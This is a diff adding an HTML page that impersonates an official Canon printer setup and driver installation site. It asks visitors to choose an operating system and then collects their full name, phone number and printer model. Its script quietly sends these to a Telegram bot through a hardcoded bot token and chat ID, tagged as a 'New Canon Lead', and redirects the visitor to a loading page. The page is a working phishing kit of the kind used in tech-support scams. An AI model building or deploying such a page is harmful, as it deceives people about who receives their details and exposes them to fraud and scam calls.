@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Canon Printer Setup - Select Your Operating System</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Helvetica Neue", Arial, sans-serif;
+            background: #f8f8f8;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* CANON RED HEADER - Exact official style */
+        .header {
+            background: #cc0000;
+            color: white;
+            padding: 18px 0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+        }
+        .header-text {
+            font-size: 16px;
+            font-weight: 500;
+            opacity: 0.95;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 30px 20px;
+        }
+        .container {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 16px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.12);
+            text-align: center;
+            max-width: 900px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 36px;
+            color: #cc0000;
+            margin-bottom: 16px;
+            font-weight: 700;
+        }
+        .subtitle {
+            font-size: 20px;
+            color: #444;
+            margin-bottom: 40px;
+        }
+
+        /* OS Cards - Canon style */
+        .os-grid {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            flex-wrap: wrap;
+        }
+        .os-card {
+            background: #fff;
+            border: 3px solid #eee;
+            border-radius: 16px;
+            padding: 32px 24px;
+            width: 220px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
+        }
+        .os-card:hover {
+            border-color: #cc0000;
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(204,0,0,0.15);
+        }
+        .os-card.selected {
+            border-color: #cc0000;
+            background: #fff5f5;
+        }
+        .os-figure {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 16px;
+        }
+        .os-figure img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .os-name {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        /* Modal - Canon style */
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .modal-content {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 20px;
+            max-width: 560px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.3);
+            border-top: 6px solid #cc0000;
+        }
+        .modal h2 {
+            font-size: 34px;
+            color: #cc0000;
+            margin-bottom: 16px;
+        }
+        .modal p {
+            font-size: 20px;
+            color: #444;
+            margin-bottom: 32px;
+        }
+        .form-group {
+            margin-bottom: 28px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: #333;
+        }
+        input {
+            width: 100%;
+            padding: 18px;
+            font-size: 22px;
+            border: 2px solid #ddd;
+            border-radius: 12px;
+            background: #fafafa;
+        }
+        input:focus {
+            outline: none;
+            border-color: #cc0000;
+            box-shadow: 0 0 0 4px rgba(204,0,0,0.15);
+        }
+
+        .btn-row {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+        .btn {
+            padding: 18px 40px;
+            font-size: 24px;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            min-width: 180px;
+        }
+        .btn-primary {
+            background: #cc0000;
+            color: white;
+        }
+        .btn-primary:hover { background: #b00000; }
+        .btn-cancel {
+            background: #666;
+            color: white;
+        }
+
+        footer {
+            background: #111;
+            color: #ccc;
+            text-align: center;
+            padding: 20px;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- CANON RED HEADER -->
+<header class="header">
+    <div class="header-content">
+        <div style="display:flex; align-items:center; gap:16px;">
+            <div style="width:48px; height:48px; background:#fff; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:28px; color:#cc0000; font-weight:900;">
+                C
+            </div>
+            <div>
+                <div class="logo">Canon</div>
+                <div class="header-text">Printer Setup & Driver Installation</div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main class="main-content">
+    <div class="container">
+        <h1>Select Your Operating System</h1>
+        <p class="subtitle">Click the one you are using</p>
+
+        <div class="os-grid">
+            <div class="os-card" data-os="windows">
+                <figure class="os-figure">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/8/87/Windows_logo_-_2021.svg" alt="Windows">
+                </figure>
+                <div class="os-name">Windows</div>
+            </div>
+
+            <div class="os-card" data-os="mac">
+                <figure class="os-figure">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="macOS">
+                </figure>
+                <div class="os-name">macOS</div>
+            </div>
+
+            <div class="os-card" data-os="chromebook">
+                <figure class="os-figure">
+                    <img src="https://www.svgrepo.com/show/378784/chrome-1-11.svg" alt="Chrome OS">
+                </figure>
+                <div class="os-name">Chrome OS</div>
+            </div>
+        </div>
+    </div>
+</main>
+
+<!-- MODAL FORM -->
+<div id="detailsModal" class="modal">
+    <div class="modal-content">
+        <h2>Enter Your Details</h2>
+        <p>We need this to find the correct Canon driver</p>
+
+        <div class="form-group">
+            <label>Full Name</label>
+            <input type="text" id="userName" placeholder="e.g. John Smith" required>
+        </div>
+        <div class="form-group">
+            <label>Contact Number</label>
+            <input type="tel" id="contactNumber" placeholder="+1 98765 43210" required>
+        </div>
+        <div class="form-group">
+            <label>Printer Model</label>
+            <input type="text" id="modelNumber" placeholder="e.g. PIXMA MG3620" required>
+        </div>
+
+        <div class="btn-row">
+            <button type="button" class="btn btn-primary" id="submitBtn">Continue</button>
+            <button type="button" class="btn btn-cancel" id="btnCancel">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<footer>
+    © 2025 Canon Printer Setup • Official Driver Installation
+</footer>
+
+<script>
+    let selectedOS = '';
+    const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
+    const CHAT_ID   = "1684000886";
+
+    document.querySelectorAll('.os-card').forEach(card => {
+        card.addEventListener('click', () => {
+            document.querySelectorAll('.os-card').forEach(c => c.classList.remove('selected'));
+            card.classList.add('selected');
+            selectedOS = card.dataset.os;
+            setTimeout(() => document.getElementById('detailsModal').style.display = 'flex', 300);
+        });
+    });
+
+    document.getElementById('btnCancel').onclick = () => {
+        document.getElementById('detailsModal').style.display = 'none';
+        selectedOS = '';
+        document.querySelectorAll('.os-card').forEach(c => c.classList.remove('selected'));
+    };
+
+    document.getElementById('submitBtn').onclick = async () => {
+        const name = document.getElementById('userName').value.trim();
+        const phone = document.getElementById('contactNumber').value.trim();
+        const model = document.getElementById('modelNumber').value.trim();
+
+        if (!name || !phone || !model || !selectedOS) {
+            alert('Please fill all fields');
+            return;
+        }
+
+        const os = selectedOS === 'mac' ? 'macOS' : selectedOS === 'windows' ? 'Windows' : 'Chrome OS';
+        const msg = `New Canon Lead\nName: ${name}\nPhone: ${phone}\nModel: ${model}\nOS: ${os}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        });
+
+        window.location.href = '/printer/loading.html';
+    };
+</script>
+
+</body>
+</html>
